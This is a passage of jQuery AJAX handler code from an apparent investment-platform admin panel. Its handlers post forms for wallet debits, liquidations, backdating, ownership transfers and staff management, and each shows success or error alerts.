  data:$('#debit_account_form').serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "User's account has been debited successfully"
		});
	 	setTimeout( function(){ window.location.href = "debit_account";}, 4000);
	 }	
	 
	  else if(data == "empty_fields"){

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Empty field(s) found!"
		});
	 }
	 else if(data == "balance_less"){

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Amount cannot be debited. User's wallet balance is less than amount!"
		});
	 }

	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in debiting user's wallet!"
		});
	 }
		
  }
  });
});


$('.error_debit').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/error_debit.php",
  method:"POST",
  data:$('#error_debit_form'+id).serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Debit has been reversed successfully"
		});
	 	setTimeout( function(){ window.location.href = "error_debit";}, 4000);
	 }	

	 else{
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in reversing debit!"
		});
	 }
		
  }
  });
});

$('.mark_as_unread').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_scripts/mark_as_unread.php",
  method:"POST",
  data:$('#mark_as_unread_form'+id).serialize(),
  success:function(data){
	 if(data.status == 'success'){
	 	$('#checked'+id).empty();
	 	$('#checked'+id).addClass('badge badge-sm badge-danger');
	 	$('#checked'+id).html('Unread');
	 	$('#unread'+id).empty();
	 	$('#badge').css("display", "block");
	 	$('#badge').html(data.message);
	 	//alert(data.message);

	 	//setTimeout( function(){ window.location.href = "notifications";}, 1000);
	 }	
	 // else{
	 // 	$.alert({
		// 	title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
		// 	closeAnimation: 'left',content: "Error in reversing debit!"
		// });
	 // }
		
  }
  });
});

$('#mark_as_read').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_scripts/mark_as_read.php",
  method:"POST",
  //data:$('#mark_as_read_form'+id).serialize(),
  success:function(data){
	 // if(data == "success"){
	 // 	$('#checked').empty();
	 // 	$('#checked').addClass('badge badge-sm badge-success');
	 // 	$('#checked').html('Read');
	 setTimeout( function(){ window.location.href = "notifications";}, 1000);
	 // }	
	 // else{
	 // 	$.alert({
		// 	title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
		// 	closeAnimation: 'left',content: "Error in reversing debit!"
		// });
	 // }
		
  }
  });
});

$('.approve_be_sales').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/approve_be_sales.php",
  method:"POST",
  data:$('#approve_be_sales_form'+id).serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Sales has been approved successfully"
		});
	 	setTimeout( function(){ window.location.href = "approve_be_sales";}, 4000);
	 }	

	 else{
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in approving sales!"
		});
	 }
		
  }
  });
});

$('.buy_package_for_user').click(function(e){
	e.preventDefault();
	let unique_id = $(this).attr('id');
	//$('#display_results'+unique_id).empty();
	$.ajax({
		url:"ajax_admin/buy_package_for_user.php",
		method:"POST",
		data: $('#buy_package_for_user_form').serialize(),
		
		success:function(data){

		// $('#display_results'+unique_id).html("<div style='background-color:lightgrey;'>"+data+"</div>");
			
		if(data == 300){
			$.alert({
			title: '<span style="color:red;">Caution!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Please enter number of slots to buy"
			});
		}

			if(data == 400){
			$.alert({
			title: '<span style="color:red;">Caution!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Please agree to terms and conditions"
			});
		}


		if(data == 500){
			$.alert({
			title: '<span style="color:red;">Caution!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "You cannot buy more than available slots"
			});
		}


			if(data == 600){
			$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "You cannot buy less than the minimum slot"
			});
		}


			if(data == 700){
			$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Insufficient wallet balance. Fund your wallet"
			});
		}

			if(data == 800){
			$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Transaction Log Insertion Error"
			});
		}

			if(data == 900){
			$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Something went wrong"
			});
		}
		if(data == 1000){
			$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Your Wallet has been deactivated, please contact FarmKonnect for more information"
			});
		}

			if(data == 200){
			$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "You have successfully subscribed to this package, you will be redirected shortly..."
			});
		   setTimeout( function(){ window.location.href = "buy_package";}, 4000);

		}



			// setTimeout( function(){ window.location.href = "profile";}, 4000);
			}	


		
		});

		
	});

$('#broadcast_message').click(function(e){
e.preventDefault();
for ( instance in CKEDITOR.instances )
       CKEDITOR.instances[instance].updateElement();
//let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/broadcast_message.php",
  method:"POST",
  data:$('#broadcast_message_form').serialize(),
  beforeSend:function(){
  		$('#broadcast_message').text('sending...');
  		$('#broadcast_message').attr('disabled', true);
  },
  success:function(data){
	 if(parseInt(data) === 200){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Broadcast Message has been sent successfully"
		});
	 	setTimeout( function(){ window.location.href = "broadcast_message";}, 4000);
	 }	
	 
	  else if(parseInt(data) === 500){

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Empty field(s) found!"
		});
	 }
	 else if(parseInt(data) === 600){

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "No Subscribed User found!"
		});
	 }

	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in sending broadcast message!"
		});
	 }
		$('#broadcast_message').text('Broadcast Message');
  		$('#broadcast_message').attr('disabled', false);
  }
  });
});

$('#edit_sensitive_details').click(function(e){
e.preventDefault();
//let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/edit_sensitive_details.php",
  method:"POST",
  data:$('#edit_sensitive_details_form').serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Request to edit sensitive details has been sent successfully"
		});
	 	setTimeout( function(){ window.location.href = "edit_sensitive_details";}, 4000);
	 }
	 else if(data == "empty_fields"){
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Empty field(s) found!"
		});
	 }	

	 else{
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in sending request!"
		});
	 }
		
  }
  });
});

$('#create_third_party_account').click(function(e){

//console.log('hello')
$.ajax({
  url:"ajax_admin/create_third_party_account.php",
  method:"POST",
  data:$('#create_third_party_account_form').serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Account has been created successfully"
		});
		setTimeout( function(){ window.location.href = "create_third_party_account";},4000);
	 }	

	 else if(data == "empty_fields"){

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Empty field(s) seen"
		});
	 }


	 else if(data == "record_exists"){

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Record already exists"
		});
	 }


	 else if(data == "password_mismatch"){

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Passwords Don't Match"
		});
	 }


	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in Registering"
		});
	 }
	 //alert(data);
		
  }
  });
 e.preventDefault();
});

$('#initiate_liquidation').click(function(e){
	e.preventDefault();
	$.ajax({
		url:"ajax_admin/liquidate_investment_IM.php",
		method:"POST",
		data:$('#initiate_liquidation_form').serialize(),
		success:function(data){
		//alert(data);
			if(data == "success"){
			$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "You have successfully sent request for liquidation. You will be notified as soon as the liquidation process is completed."
			});
		   setTimeout( function(){ window.location.href = "initiate_liquidation";}, 7000);
		}
	    
	    if(data == "exists"){
			$.alert({
			title: '<span style="color:red;">Caution!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Oops...The liquidation request has been sent already."
			});
		}


		if(data == "failed"){
			$.alert({
			title: '<span style="color:red;">Caution!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Oops...The liquidation process failed."
			});
		}
		
		}
		});
	

	
});

$('.transfer_package_ownership').click(function(e){
	e.preventDefault();
	$.ajax({
		url:"ajax_admin/transfer_package_ownership.php",
		method:"POST",
		data:$('#transfer_package_ownership_form').serialize(),
		success:function(data){
		//alert(data);
			if(data == "success"){
			$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "You have successfully sent request to transfer package ownership"
			});
		   setTimeout( function(){ window.location.href = "transfer_package_ownership";}, 6000);
		}

		else if(data == "empty_fields"){
			$.alert({
			title: '<span style="color:red;">Caution!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Empty field(s) found"
			});
		}
	    
	    else if(data == "exists"){
			$.alert({
			title: '<span style="color:red;">Caution!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Oops...The transfer of ownership request for this investment has been sent already."
			});
		}

		else if(data == "same_id_detected"){
			$.alert({
			title: '<span style="color:red;">Caution!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Oops...You can't transfer an investment to the same person"
			});
		}


		else if(data == "failed"){
			$.alert({
			title: '<span style="color:red;">Caution!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Oops...the transfer of ownership failed."
			});
		}
		else{
			$.alert({
			title: '<span style="color:red;">Caution!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Server Error!"
			});
		}
		
		}
		});	
});


$('.disable_account').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/disable_user_account.php",
  method:"POST",
  data:$('#disable_account_form'+id).serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "User has been disabled successfully"
		});
	 	setTimeout( function(){ window.location.href = "disable_account";}, 4000);
	 }	

	 else{
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in disabling user!"
		});
	 }
		
  }
  });
});

$('.enable_account').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/enable_user_account.php",
  method:"POST",
  data:$('#enable_account_form'+id).serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "User has been enabled successfully"
		});
	 	setTimeout( function(){ window.location.href = "disable_account";}, 4000);
	 }	

	 else{
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in enabling user!"
		});
	 }
		
  }
  });
});


$('.approve_sack_request').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/approve_sack_request.php",
  method:"POST",
  data:$('#approve_sack_request_form'+id).serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Business Executive has been sacked successfully"
		});
	 	$('.approve_modal').modal("hide");
		$('#approve_sack_modal'+id).html("<small class='badge badge-success'>Approved</small>");
	 	//setTimeout( function(){ window.location.href = "sack_be_request";}, 4000);
	 }	

	 else{
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in sacking Business Executive!"
		});
	 }
		
  }
  });
});

$('.approve_suspend_request').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/approve_suspend_request.php",
  method:"POST",
  data:$('#approve_suspend_request_form'+id).serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Business Executive has been suspended successfully"
		});
	 	$('.approve_modal').modal("hide");
		$('#approve_suspend_modal'+id).html("<small class='badge badge-success'>Approved</small>");
	 	//setTimeout( function(){ window.location.href = "suspend_be_request";}, 4000);
	 }	

	 else{
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in suspending Business Executive!"
		});
	 }
		
  }
  });
});

$('.assign_BE').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/assign_BE_to_client.php",
  method:"POST",
  data:$('#assign_BE_form'+id).serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Client has been assigned to BE successfully"
		});
	 	setTimeout( function(){ window.location.href = "lead_pool_MM";}, 4000);
	 }	

	  else if(data == "empty_fields"){

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Please select a BE!"
		});
	 }
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in assigning client!"
		});
	 }
		
  }
  });
});

$('#register_be').click(function(e){

//console.log('hello')
$.ajax({
	beforeSend: function(){
		$('#register_be').text("Registering");
		$('#register_be').attr("disabled", false);
	},
  url:"ajax_scripts/register_be_ajax.php",
  method:"POST",
  data:$('#register_be_form').serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "You have successfully registered"
		});
		setTimeout( function(){ window.location.href = "user_to_role";},7000);
	 }	

	 else if(data == "empty_fields"){

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Empty field(s) found"
		});
	 }


	 else if(data == "record_exists"){

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Record already exists"
		});
	 }


	 else if(data == "password_mismatch"){

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Passwords Don't Match"
		});
	 }


	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in registering"
		});
	 }
	 $('#register_be').text("Register");
		$('#register_be').attr("disabled", false);
	 //alert(data);
		
  }
  });
 e.preventDefault();
});

$('.approve_target_request').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/approve_target_request.php",
  method:"POST",
  data:$('#approve_target_request_form'+id).serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Target Adjustment has been approved successfully"
		});
	 	$('.approve_modal').modal("hide");
		$('#approve_target_modal'+id).html("<small class='badge badge-success'>Approved</small>");	
	 	//setTimeout( function(){ window.location.href = "target_adjustment_request";}, 4000);
	 }	

	 else{
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in approving request!"
		});
	 }
		
  }
  });
});

$('.reject_target_request').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/reject_target_request.php",
  method:"POST",
  data:$('#reject_target_request_form'+id).serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Target Adjustment has been rejected successfully"
		});
	 	$('.reject_modal').modal("hide");
		$('#reject_target_modal'+id).html("<small class='badge badge-danger'>Rejected</small>");	
	 	//setTimeout( function(){ window.location.href = "target_adjustment_request";}, 4000);
	 }	

	 else{
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in rejecting request!"
		});
	 }
		
  }
  });
});

$('.approve_change_user_details').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/approve_change_user_details.php",
  method:"POST",
  data:$('#approve_change_user_details_form'+id).serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Request has been approved successfully"
		});
	 	setTimeout( function(){ window.location.href = "edit_user_information_request";}, 4000);
	 }	

	 else{
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in approving request!"
		});
	 }
		
  }
  });
});

$('.approve_change_user_details_MM').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/approve_change_user_details_MM.php",
  method:"POST",
  data:$('#approve_change_user_details_MM_form'+id).serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Request has been approved successfully"
		});
	 	setTimeout( function(){ window.location.href = "edit_user_information_request_MM";}, 4000);
	 }	

	 else{
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in approving request!"
		});
	 }
		
  }
  });
});

$('.approve_change_user_details_acc ').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/approve_change_user_details_acc.php",
  method:"POST",
  data:$('#approve_change_user_details_acc_form'+id).serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Request has been approved successfully"
		});
	 	$('.approve_modal').modal("hide");
		$('#approve_edi_user_modal'+id).html("<small class='badge badge-success'>Approved</small>");
	 	//setTimeout( function(){ window.location.href = "edit_user_information_sa";}, 4000);
	 }	

	 else{
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in approving request!"
		});
	 }
		
  }
  });
});

$('.approve_liquidation_request ').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/approve_liquidation_request.php",
  method:"POST",
  data:$('#approve_liquidation_request_form'+id).serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Liquidation Request has been approved successfully"
		});
	 	$('.approve_modal').modal("hide");
		$('#approve_liquidation_modal'+id).html("<small class='badge badge-success'>Approved</small>");
	 	//setTimeout( function(){ window.location.href = "liquidation_request";}, 4000);
	 }	

	 else{
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in approving liquidation request!"
		});
	 }
		
  }
  });
});

$('.reject_liquidation_request ').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/reject_liquidation_request.php",
  method:"POST",
  data:$('#reject_liquidation_request_form'+id).serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Liquidation Request has been rejected successfully"
		});
	 	$('.reject_modal').modal("hide");
		$('#reject_liquidation_modal'+id).html("<small class='badge badge-danger'>Rejected</small>");
	 	//setTimeout( function(){ window.location.href = "liquidation_request";}, 4000);
	 }	

	 else{
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in rejecting request!"
		});
	 }
		
  }
  });
});

$('.approve_liquidation_acc').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/approve_liquidation_acc.php",
  method:"POST",
  data:$('#approve_liquidation_acc_form'+id).serialize(),
  beforeSend: function(){
  	$('.approve_liquidation_acc').text("Please wait...");
    $('.approve_liquidation_acc').attr("disabled", true);
  },
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Liquidation Request has been approved successfully"
		});
	 	setTimeout( function(){ window.location.href = "accountant_liquidation_request";}, 4000);
	 }	

	 else{
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in approving liquidation request!"
		});
	 }
	$('.approve_liquidation_acc').text("Approve");
    $('.approve_liquidation_acc').attr("disabled", false);	
  }
  });
});

$('.reject_liquidation_acc ').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/reject_liquidation_request.php",
  method:"POST",
  data:$('#reject_liquidation_acc_form'+id).serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Liquidation Request has been rejected successfully"
		});
	 	setTimeout( function(){ window.location.href = "accountant_liquidation_request";}, 4000);
	 }	

	 else{
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in rejected liquidation request!"
		});
	 }
		
  }
  });
});


$('.approve_investment_transfer').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/approve_investment_transfer.php",
  method:"POST",
  data:$('#approve_investment_transfer_form'+id).serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Transfer of Investment Ownership has been approved successfully"
		});
	 	$('.approve_modal').modal("hide");
		$('#approve_transfer_modal'+id).html("<small class='badge badge-success'>Approved</small>");
	 	//setTimeout( function(){ window.location.href = "transfer_investment_ownership_request";}, 4000);
	 }	

	 else{
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in approving transfer of ownership investment request!"
		});
	 }
		
  }
  });
});

$('.reject_investment_transfer').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/reject_investment_transfer.php",
  method:"POST",
  data:$('#reject_investment_transfer_form'+id).serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Transfer of Investment Ownership has been rejected successfully"
		});
	 	$('.rejectverify_modal').modal("hide");
		$('#reject_transfer_modal'+id).html("<small class='badge badge-danger'>Rejected</small>");
	 	//setTimeout( function(){ window.location.href = "transfer_investment_ownership_request";}, 4000);
	 }	

	 else{
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in approving transfer of ownership investment request!"
		});
	 }
		
  }
  });
});

$('.approve_backdate').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/approve_backdate.php",
  method:"POST",
  data:$('#approve_backdate_form'+id).serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Investment backdate has been approved successfully"
		});
	 	$('.approve_backdate_modal').modal("hide");
		$('#verify_user_modal'+id).html("<small class='badge badge-success'>Approved</small>");
	 	//setTimeout( function(){ window.location.href = "backdate_requests";}, 4000);
	 }	

	 else{
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in backdating investment request!"
		});
	 }
		
  }
  });
});

$('.approve_backdate_MM').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/approve_backdate_MM.php",
  method:"POST",
  data:$('#approve_backdate_MM_form'+id).serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Investment backdate has been approved successfully"
		});
	 	setTimeout( function(){ window.location.href = "backdate_requests_MM";}, 4000);
	 }	

	 else{
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in backdating investment request!"
		});
	 }
		
  }
  });
});

$('.accountant_approve_backdate').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/accountant_approve_backdate.php",
  method:"POST",
  data:$('#accountant_approve_backdate_form'+id).serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Investment has been backdated successfully"
		});
	 	setTimeout( function(){ window.location.href = "accountant_backdate_requests";}, 4000);
	 }	

	 else{
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in backdating investment!"
		});
	 }
//alert(data);
		
  }
  });
});

$('.accountant_reject_backdate').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/accountant_reject_backdate.php",
  method:"POST",
  data:$('#accountant_reject_backdate_form'+id).serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Backdate Investment has been rejected successfully"
		});
	 	setTimeout( function(){ window.location.href = "accountant_backdate_requests";}, 4000);
	 }	

	 else{
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in rejecting backdate investment!"
		});
	 }
		
  }
  });
});


$('#recruit_be').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/recruit_be.php",
  method:"POST",
  data:$('#recruit_be_form').serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Business Executive has been recruited successfully"
		});
	 	setTimeout( function(){ window.location.href = "recruit_be";}, 4000);
	 }
	  else if(data == "empty_fields"){

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Empty field(s) found!"
		});
	 }

	 else if(data == "record_exists"){

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Record Already Exists!"
		});
	 }
	
	 
	 else{

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in setting target!"
		});
	 }
		
  }
  });
});


$('.transfer_be').click(function(e){
	e.preventDefault();
	$.ajax({
	url:"ajax_admin/transfer_be_ajax.php",
	method:"POST",
	data:$('#transfer_be_form').serialize(),
	success:function(data){
	 if(data == "success"){
	 $.alert({
	 title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
	 closeAnimation: 'left',content: "You have successfully transfered Business Executive"
	 });
	 setTimeout( function(){ window.location.href = "transfer_be";}, 4000);
	 }	

	 else if(data == "empty_fields"){
	 $.alert({
	title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
	closeAnimation: 'left',content: "Empty Field (s) found"
	 });
	 }
	 else if(data == "not_possible"){
	 $.alert({
